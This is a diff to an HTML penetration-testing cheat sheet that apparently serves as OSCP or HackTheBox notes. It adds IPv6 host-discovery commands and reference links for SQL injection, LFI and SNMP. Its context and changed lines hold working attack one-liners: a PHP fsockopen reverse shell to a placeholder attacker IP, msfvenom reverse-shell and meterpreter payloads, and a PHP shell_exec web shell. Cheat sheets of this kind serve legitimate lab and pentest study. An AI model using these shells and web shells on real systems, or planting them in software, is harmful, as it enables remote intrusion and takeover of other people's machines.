@@ -61,6 +61,40 @@
 <br>
 <br>
 <hr>
+<p><h3>Recon:</h3></p>
+<pre style="background-color:black;color:white;">
+#Companies
+https://github.com/laramies/metagoofil
+
+#Port Knocking
+https://www.digitalwhisper.co.il/files/Zines/0x02/DW2-5-Port-Knocking.pdf
+</pre>
+<hr>
+<p><h3>IPv6:</h3></p>
+<pre style="background-color:black;color:white;">
+#Explaination - https://www.youtube.com/watch?v=1UGxjqTnuyo&t=330s (Sneaky - HTB)
+Linux - IPv6 is calculated by the MAC address.
+MAC address to IPv6 link-local address calculator - http://www.sput.nl/internet/ipv6/ll-mac.html
+ip6tables -L #IPv6 firewall rules
+
+#Install it:
+THC-IPv6 Attack Tool - https://packetstormsecurity.com/groups/thc/
+
+#Host Discovery (including windows boxes)
+./alive6 [INTERFACE_NAME] -e ff02::1	#ping all multicast address. "ICMP parameter problem" indicates on a windows box.
+ip -6 neigh|awk '{print $1}' > [IPv6_ADDRESSES_FILE]
+nmap -6	-n -iL [IPv6_ADDRESSES_FILE]	#Scan those targets
+
+#Host Discovery (method 2 - linux boxes only):
+ping [TARGET_IP]
+arp -n	#grab target's MAC and convert it to IPv6
+ping6 [IPv6]%[INTERFACE_NAME]	#Example: ping6 fe80::250:56ff:feaa:4146%tun0
+
+#Host Discovery (method 3 - linux boxes only):
+ping6 -I [INTERFACE_NAME] ff02::1	#ping all multicast address
+ip -6 neigh	#IPv6 "ARP table"
+</pre>
+<hr>
 <p><h3>Subdomain fuzzing:</h3></p>
 <pre style="background-color:black;color:white;">
 wfuzz -w cewl_output -u streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb"
@@ -102,10 +136,11 @@ joomlavs.rb -u [TARGET_URL] --scan-all	(Check -h option for help)
 <hr>
 <p><h3>SQL Injection</h3></p>
 <p><font size="3.5" color="black">Cheat Sheets:</font></p>
-<p><font size="3.5" color="black">* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</font></p>
 <p><font size="3.5" color="black">* https://websec.ca/kb/sql_injection#MSSQL_Default_Databases</font></p>
+<p><font size="3.5" color="black">* http://www.securityidiots.com/Web-Pentest/SQL-Injection</font></p>
 <p><font size="3.5" color="black">* http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</font></p>
-<p><font size="3.5" color="black">* https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
+<p><font size="3.5" color="black">* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</font></p>
+<p><font size="3.5" color="black">* https://github.com/Gandosha/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
 <br>
 <p><font size="3.5" color="black">Examples:</font></p>
 <p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
@@ -119,11 +154,16 @@ joomlavs.rb -u [TARGET_URL] --scan-all	(Check -h option for help)
 <hr>
 <p><h3>LFI</h3></p>
 <pre style="background-color:black;color:white;">
-#Great read - https://highon.coffee/blog/lfi-cheat-sheet/	#PHP wrappers etc
+#Great read: 
+http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html		#LFI guide
+https://highon.coffee/blog/lfi-cheat-sheet/	#PHP wrappers etc
+https://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref	#LFI to code execution
 </pre>
 <hr>
 <p><h3>DNS port discovered?</h3></p>
 <pre style="background-color:black;color:white;">
+#Great read - http://www.securityidiots.com/Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html
+
 whois domain-name-here.com			#WHOIS enumeration
 dig a domain-name-here.com @nameserver 		#Perform DNS IP Lookup
 dig mx domain-name-here.com @nameserver		#Perform MX Record Lookup
@@ -196,6 +236,7 @@ smtp-user-enum -M EXPN -U [WORDLIST_PATH] -t [IP_ADDRESS]	(verify if username is
 <hr>
 <p><h3>How about SNMP ports?</h3></p>
 <pre style="background-color:black;color:white;">
+SNMP IPv6 Enumeration - https://github.com/trickster0/Enyx
 Default Community Names: public, private, cisco, manager
 
 Enumerate MIB:
@@ -524,7 +565,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKE
 <p><font size="3.5" color="black">PHP</font></p>
 <pre style="background-color:black;color:white;">
 php -r '$sock=fsockopen("[ATTACKER's_IP_ADDRESS]",[ATTACKER's_PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'	(reverse shell)
-<?php echo shell_exec($_GET[‘cmd’]);?>	(invoke cmd - usage: [URL]?cmd=[COMMAND])
+<?php echo shell_exec($_GET['cmd']);?>	(invoke cmd - usage: [URL]?cmd=[COMMAND])
 msfvenom -p php/meterpreter_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.php && echo '<?php ' | cat - shell.php > temp && mv temp shell.php && echo '?>' >> shell.php	(reverse shell using msfvenom)
 </pre>
 <p><font size="3.5" color="black">ASP</font></p>
